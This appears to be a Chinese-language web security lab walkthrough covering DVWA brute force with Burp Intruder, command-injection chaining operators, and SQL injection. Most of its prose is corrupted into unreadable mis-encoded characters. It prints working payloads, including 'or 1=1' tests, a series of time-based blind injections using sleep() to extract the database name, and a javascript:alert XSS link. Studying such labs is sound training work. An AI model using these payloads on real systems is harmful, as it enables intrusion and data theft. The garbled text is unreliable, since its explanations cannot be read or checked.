
### [web����©������](��)
---

��һƪ�����ǽ�������δ©����������һ�����ǽ�ͨ��̽��dvwa��©�����򵥶Դ�����з����������˽������Ƶ����̡�

## [Brute Force]

�����ƽ⣬����˼�飬ͨ��ö���ֵ�½��û���¼�ʺż����룬û�кܺõķ���ȥ���ⱻ�����ƽ⣬����ͨ���������ӱ����ƽ�ĳɱ���

![](https://raw.githubusercontent.com/Orion1250/picture/master/1.png)

[XSS](javascript:alert(1))

ͼ1

ͨ���鿴�������ǿ��Կ��������жϵ�¼���̣�δ���κ���Ч�ı������ƣ����޵�¼�������ƣ�Ҳ����֤����ơ�

![](https://raw.githubusercontent.com/Orion1250/picture/master/2.png)

ͼ2

��������ʹ��burp���б����ƽ�õ�¼�û���������

�����������ô���Ը�λ�ý��б��ƣ����˻��ʣ�������ô����������Ǽ򵥽�����

���ȣ���Ҫ��������burp������127.0.0.1���˿�Ϊ8080

![](https://raw.githubusercontent.com/Orion1250/picture/master/3.png)

ͼ3

��Σ�������������ô���ͬ������������Ϊ127.0.0.1���˿�Ϊ8080

![](https://raw.githubusercontent.com/Orion1250/picture/master/4.png)
 
ͼ4

���濪ʼץȡ�����
 
![](https://raw.githubusercontent.com/Orion1250/picture/master/5.png)

ͼ5

���͵�intruder���б����ƽ�

![](https://raw.githubusercontent.com/Orion1250/picture/master/6.png)
 
ͼ6

ʹ��cluster bomb����ѡ��username��password���������б���

![](https://raw.githubusercontent.com/Orion1250/picture/master/7.png)
 
ͼ7

����ѡ��payloads������1Ϊ�û��ʺţ�2Ϊ����

![](https://raw.githubusercontent.com/Orion1250/picture/master/8.png) 

ͼ8

Payload2�ֵ䣬���Կ�����Ҫ����32�Σ�Ҳ���ǽ����ж�Ӧ��payload���б���һ��

![](https://raw.githubusercontent.com/Orion1250/picture/master/9.png)
 
ͼ9

���ﰴ���Ƚ������򣬿��Կ����½����ȷ���û���������

![](https://raw.githubusercontent.com/Orion1250/picture/master/10.png)
 
ͼ10

## Command Injection
### low

![](https://raw.githubusercontent.com/Orion1250/picture/master/11.png)
 
ͼ11

�鿴�������ǿ��Է��֣�������δ�������������У�飬ֱ�ӽ���ִ��

shell_exec������

ͨ�� shell ����ִ��������ҽ�������������ַ����ķ�ʽ����

![](https://raw.githubusercontent.com/Orion1250/picture/master/12.png)
 
ͼ12

Windows��Linux����ʹ��&&����ִ�ж�������

![](https://raw.githubusercontent.com/Orion1250/picture/master/13.png) 

ͼ13

### medium

�ɷ��ֶ�&&�ͣ������˹��ˣ�����ʹ�ú��������˻��ƿ��ܻ���ڹ��˲���ȫ�Ŀ��ܡ������±��ƹ�

![](https://raw.githubusercontent.com/Orion1250/picture/master/14.png)
 
ͼ14

����û�ж�&���й��ˣ�����ʹ��&���ֿ�����ִ������

![](https://raw.githubusercontent.com/Orion1250/picture/master/15.png)
 
ͼ15

�򵥽����¡�&&������&������||������|��������

`����1&&����2`

&&�����ǰ��������Ѿ���false�ˣ���ô�������������Ҫ�ٽ����κε��ж�

![](https://raw.githubusercontent.com/Orion1250/picture/master/16.png)
 
ͼ16

`����1&����2`

&����ʾ���е��ж�������Ҫִ�У�����ǰ���Ƿ�����

![](https://raw.githubusercontent.com/Orion1250/picture/master/17.png)
 
ͼ17

`����1 | ����2`

|���ǹܵ�������ʾ������1�������Ϊ���� 2�����룬����ֻ��ӡ����2ִ�еĽ��

![](https://raw.githubusercontent.com/Orion1250/picture/master/18.png)
 
ͼ18

`����1||����2`

||�����ߵ���˼���������1��true����ô�Ͳ��жϣ���ǰ��Ϊfalse���Ż�ִ������2

![](https://raw.githubusercontent.com/Orion1250/picture/master/19.png)
 
ͼ19

### High

ͬ�����鿴�߼����Կ���ͬ��ʹ�ú��������ƣ���Ȼ�����ƹ������ﲻ�ڽ��в���

![](https://raw.githubusercontent.com/Orion1250/picture/master/20.png)
 
ͼ20

����򵥽�����ʱ����ע�룬����ʹ�õ�©������Ϊzvuldrill

## SQLע��С��

���ȣ�ʹ�á����ԣ��鿴�Ƿ����ע��㣬���Է���ҳ����ֱ���˵�����ܴ���ע��

![](https://raw.githubusercontent.com/Orion1250/picture/master/21.png)
 
ͼ21

�����һ�����ԣ���������ʹ��or���в���1' or 1=1#��#��ʾע�ͣ�or��ʾ������һ��Ϊ�漴Ϊ�棬����ʹ��1=1��1=1����֪���϶�Ϊ�棬��ô�����϶�Ϊ�棬���Կ���ҳ��������ʾ���������е���Ϣ��ʾ����

![](https://raw.githubusercontent.com/Orion1250/picture/master/22.png)
 
ͼ22

ʹ��or���в���1' or 1=2#��1=2˵�����٣����߶�Ϊ�٣���ô�϶��Ǽ٣����Կ���ҳ��δ��ʾ����

![](https://raw.githubusercontent.com/Orion1250/picture/master/23.png)
 
ͼ23

��������ѧϰ��ʱ����ע�룬��Ҫ��ͨ���鿴���ݿ����Ӧʱ�����ж��Ƿ����ע��©����������������Ϊ5�룬��ҳ�����5���ӵ���ʱ��˵����ͨ���ô�����SQL��䣬�����ݿ���н���

�ж��Ƿ����ʱ����ע��

�鿴��ʱǰ��ҳ��

![](https://raw.githubusercontent.com/Orion1250/picture/master/24.png)
 
ͼ24

�鿴������ʱ�����ҳ��

`1%' and (select * from (select(sleep(5)))a)-- -`

���Կ���������ʱ����ʱ5��

![](https://raw.githubusercontent.com/Orion1250/picture/master/25.png)
 
ͼ25

�������Ƕ����ݿ���в½⣬���򵥽������йغ�����

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>65,0,5)))))a)-- -`

˵����

schema_name��ʾ���ݿ�����

ifnull��ʾ�ж������Ƿ�Ϊ��

distinct��ʾѡ���ظ�������

mid��ʾ���ڴ��ı��ֶ�����ȡ�ַ�

ord��ʾ�������ߵ��ַ����ַ���str��һ�����ֽ��ַ������ظ��ַ������� 

if������ʾ�жϣ������ݽ����ж�

65��90Ϊ26����дӢ����ĸ��97��122��Ϊ26��СдӢ����ĸ������ΪһЩ�����š�������ŵȡ�

����ע��������˼�Ƕ����ݿ���в½⣬�жϵ�һ���ַ��Ƿ����65��Ҳ���Ǹ��ַ���acsii���Ƿ����65,65��ʾa������ʱ5-0����ʱ5�룬������ʱ��ʱ5-5�룬Ҳ����0�롣ͨ���鿴��ʱʱ������жϸ�λ���ַ����������ǿ�����ʱ�ˣ�˵������65��

![](https://raw.githubusercontent.com/Orion1250/picture/master/26.png)
 
ͼ26

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>96,0,5)))))a)-- -`

����ע��������˼�Ƕ����ݿ���в½⣬�жϵ�һ���ַ��Ƿ����65��Ҳ���Ǹ��ַ���acsii���Ƿ����96,96��ʾA��ǰһ���ַ�������ʱ5-0����ʱ5�룬������ʱ��ʱ5-5�룬Ҳ����0�롣ͨ���鿴��ʱʱ������жϸ�λ���ַ����������ǿ�����ʱ�ˣ�˵������96��

![](https://raw.githubusercontent.com/Orion1250/picture/master/27.png)
 
ͼ27

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>112,0,5)))))a)-- -`

����ע��������˼�Ƕ����ݿ���в½⣬�жϵ�һ���ַ��Ƿ����112������ʹ���۰�ķ�ʽ���в½⣬�Լ��ٲ½��ʱ�䣬Ҳ���Ǹ��ַ���acsii���Ƿ����112������ʱ5-0����ʱ5�룬������ʱ��ʱ5-5�룬Ҳ����0�롣ͨ���鿴��ʱʱ������жϸ�λ���ַ�����������û�У�˵��С��112��

![](https://raw.githubusercontent.com/Orion1250/picture/master/28.png)
 
ͼ28

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>104,0,5)))))a)-- -`

����ע��������˼�Ƕ����ݿ���в½⣬�жϵ�һ���ַ��Ƿ����104������ʹ���۰�ķ�ʽ���в½⣬�Լ��ٲ½��ʱ�䣬Ҳ���Ǹ��ַ���acsii���Ƿ����104������ʱ5-0����ʱ5�룬������ʱ��ʱ5-5�룬Ҳ����0�롣ͨ���鿴��ʱʱ������жϸ�λ���ַ�����������û�У�˵������104��

![](https://raw.githubusercontent.com/Orion1250/picture/master/29.png)
 
ͼ29

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>108,0,5)))))a)-- -`

����ע��������˼�Ƕ����ݿ���в½⣬�жϵ�һ���ַ��Ƿ����108������ʹ���۰�ķ�ʽ���в½⣬�Լ��ٲ½��ʱ�䣬Ҳ���Ǹ��ַ���acsii���Ƿ����108������ʱ5-0����ʱ5�룬������ʱ��ʱ5-5�룬Ҳ����0�롣ͨ���鿴��ʱʱ������жϸ�λ���ַ���˵������108��

![](https://raw.githubusercontent.com/Orion1250/picture/master/30.png)
 
ͼ30

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>110,0,5)))))a)-- -`

����ע��������˼�Ƕ����ݿ���в½⣬�жϵ�һ���ַ��Ƿ����110������ʹ���۰�ķ�ʽ���в½⣬�Լ��ٲ½��ʱ�䣬Ҳ���Ǹ��ַ���acsii���Ƿ����110������ʱ5-0����ʱ5�룬������ʱ��ʱ5-5�룬Ҳ����0�롣ͨ���鿴��ʱʱ������жϸ�λ���ַ�����������û�У�˵��С��110��

![](https://raw.githubusercontent.com/Orion1250/picture/master/31.png)
 
ͼ31

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))=109,0,5)))))a)-- -`

���濴���Ѿ���108-110֮���ˣ����Բ���109����110�����ǿ�����109ʱ��ʱ�䣬���Կ�����ʱ��5�룬˵������109��Ҳ����Сд��ĸm

![](https://raw.githubusercontent.com/Orion1250/picture/master/32.png)
 
ͼ32

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))=110,0,5)))))a)-- -`

���Կ��������δ��ʱ��˵���²���ȷ

![](https://raw.githubusercontent.com/Orion1250/picture/master/33.png)
 
ͼ33

���������²����һ�������ﲻ�ٽ��в²⣬ֱ�ӽ��µ����ַ������д��������²�����ݿ�Ϊmysql��ascii��ֱ�Ϊ109��121��115��113��108��

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),2,1))=121,0,5)))))a)-- -`

���ǿ���������н�λ�ø�Ϊ2Ҳ����Ҫ�µڶ����ַ��������ַ�ͬ��

![](https://raw.githubusercontent.com/Orion1250/picture/master/34.png)
 
ͼ34

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),3,1))=115,0,5)))))a)-- -`

![](https://raw.githubusercontent.com/Orion1250/picture/master/35.png)
 
ͼ35

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),4,1))=113,0,5)))))a)-- -`

![](https://raw.githubusercontent.com/Orion1250/picture/master/36.png)
 
ͼ36

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),5,1))=108,0,5)))))a)-- -`

![](https://raw.githubusercontent.com/Orion1250/picture/master/37.png)
 
ͼ37






